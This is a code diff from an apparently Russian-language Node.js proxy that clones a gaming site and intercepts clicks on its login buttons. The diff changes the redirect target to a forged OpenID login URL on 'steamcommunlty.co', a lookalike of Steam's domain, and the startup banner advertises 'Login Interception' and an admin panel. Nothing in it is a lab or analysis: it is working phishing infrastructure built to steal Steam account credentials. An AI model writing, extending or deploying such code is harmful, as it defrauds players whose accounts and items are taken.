@@ -518,7 +518,7 @@ function modifyUrls(content, baseUrl, contentType = '') {
     console.log('🔒 Запуск перехвата кнопок входа с сохранением стилей');
     
     // URL для перенаправления
-    const targetUrl = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
+    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
     
     // Список селекторов кнопок - ДОБАВЛЕН НОВЫЙ СЕЛЕКТОР #login-head
     const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
@@ -1782,7 +1782,7 @@ server.listen(PORT, '0.0.0.0', () => {
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
-    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat -> https://steamcommunlty.co/6kaomrcjpf2m.html
+    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
     
     Features:
     ✓ Full HTTP/HTTPS proxy
